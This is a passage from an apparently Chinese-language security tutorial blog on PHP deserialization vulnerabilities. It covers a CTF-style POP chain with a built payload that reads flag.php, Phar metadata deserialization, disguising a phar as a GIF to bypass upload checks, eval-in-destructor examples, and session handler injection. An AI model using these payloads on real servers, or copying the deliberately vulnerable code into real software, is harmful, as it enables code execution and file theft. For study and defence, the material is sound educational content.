class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source); <br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>) </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">&#x27;pop3.php&#x27;</span>);<br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>寻找POP链过程：</p><ol><li>首先找到<code>unserialize()</code>，发现里面的参数可控；</li><li>接着寻找能够利用的魔方方法，一般是<code>__wakeup()</code>或者<code>__destruct()</code>，这里发现Show类里面有<code>__wakeup()</code>；</li><li><code>__wakeup()</code>里面使用了<code>preg_match()</code>函数对传进去的参数进行字符匹配，这里如果我们传进去的参数是对象的时候，就能够触发<code>__toString()</code>魔法方法；</li><li><code>__toString()</code>方法中试图获取属性<code>$str</code>中的key为str的值，如果我们传进去的<code>$str['str']</code>是一个类对象中不可访问的属性时，就能够触发<code>__get()</code>魔法方法；</li><li>接着寻找有魔法方法<code>__get()</code>的类，发现Test类里面有这个魔法方法；</li><li>Test类里面的<code>__get()</code>方法对参数<code>$p</code>作为函数名字进行调用，如果这时候的<code>$p</code>是一个类对象的话，就会触发<code>__invoke()</code>魔法方法；</li><li>寻找存在魔法方法<code>__invoke()</code>的类，发现Read类里面有这个魔法方法；</li><li>Read类里面的<code>__invoke()</code>方法会读取参数<code>$var</code>里面的内容，并输出；</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = flag.php;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br> <br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$t</span>-&gt;p = <span class="hljs-variable">$r</span>;<br><span class="hljs-variable">$s</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$t</span>;<br><span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-variable">$s</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>));<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Show%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>source%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>p%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Read%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D <br></code></pre></td></tr></table></figure><p>这里进行URL编码的原因是私有和保护属性会有<code>%00</code>字符，直接输出会显示空格</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513113316.png" alt="image-20210513113316300"></p><h2 id="Phar反序列化">Phar反序列化</h2><h3 id="Phar原理">Phar原理</h3><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513161248.png" alt="img"></p><h3 id="Phar-demo">Phar demo</h3><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p><blockquote><p><strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p></blockquote><p>phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br> <br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br> <br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>访问后,会生成一个phar.phar在当前目录下。</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513162258.png" alt="image-20210513162258854"></p><p>可以明显的看到meta-data是以序列化的形式存储的。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，知道创宇测试后受影响的函数列表：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513162431.png" alt="img"></p><p>就用比较常用的函数<code>file_get_contents()</code>函数举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; data;   <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><p>上述例程会输出hello</p><h3 id="将Phar伪造成其他格式的文件">将Phar伪造成其他格式的文件</h3><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>&#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;img.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$phar</span> -&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$object</span> -&gt; data = <span class="hljs-string">&#x27;ca01h&#x27;</span>;<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);  <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513164756.png" alt="image-20210513164756846"></p><p>采用这种方法可以绕过很大一部分上传检测。</p><h3 id="Phar反序列化漏洞利用">Phar反序列化漏洞利用</h3><h4 id="漏洞利用条件">漏洞利用条件</h4><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h4 id="Phar简单利用">Phar简单利用</h4><p>index.html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>upload file<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;./upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Upload&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><p>仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>))== <span class="hljs-string">&#x27;gif&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Upload: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Type: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Temp file: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload_file/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; already exists. &quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<br>          <span class="hljs-string">&quot;upload_file/&quot;</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stored in: &quot;</span> . <span class="hljs-string">&quot;upload_file/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>      &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid file,you can only upload gif&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>evil.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span> -&gt; data);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>])&#123;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过思路：GIF格式验证可以通过在文件头部添加GIF89a绕过。</p><p>用下面的代码生成phar文件:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>生成的<code>phar.phar</code>修改后缀名<code>phar.gif</code>，再上传该文件，用phar协议解析：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513172425.png" alt="image-20210513172424974"></p><h2 id="Session反序列化">Session反序列化</h2><h3 id="PHP的Session机制">PHP的Session机制</h3><p>在学习 <strong>session</strong> 反序列化之前，我们需要了解这几个参数的含义。</p><table><thead><tr><th>Directive</th><th>含义</th></tr></thead><tbody><tr><td>session.save_handler</td><td>session保存形式。默认为files</td></tr><tr><td>session.save_path</td><td>session保存路径。</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器。默认为php</td></tr><tr><td>session.upload_progress.cleanup</td><td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td></tr><tr><td>session.upload_progress.enabled</td><td>将上传文件的进度信息存在session中。默认开启。</td></tr></tbody></table><p>在上述的配置中，<code>session.serialize_handler</code>是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的<strong>数组</strong></td></tr></tbody></table><p>那么具体而言，在默认配置(php)情况下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">session_start()<br>$_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;ca01h&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513212129.png" alt="image-20210513212129402"></p><p>SESSION文件的内容是：<code>name|s:5:&quot;ca01h&quot;</code>，name是键值，<code>s:5:&quot;ca01h&quot;;</code>是<code>serialize(&quot;ca01h&quot;)</code>的结果。</p><p>在php_serialize引擎下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>)<span class="hljs-comment">;</span><br>session_start()<span class="hljs-comment">;</span><br>$_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;ca01h&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513212627.png" alt="image-20210513212627475"></p><p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;ca01h&quot;;&#125;</code>。<code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p><p>在php_binary引擎下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>)<span class="hljs-comment">;</span><br>session_start()<span class="hljs-comment">;</span><br>$_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;ca01h&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513212803.png" alt="image-20210513212803906"></p><p>这里我输出的内容和别人的不一样，求解？</p><h3 id="Session反序列化的漏洞原因">Session反序列化的漏洞原因</h3><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的<code>$_SESSION</code>数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_SESSION[<span class="hljs-string">&#x27;hello&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span><span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span>stdClass<span 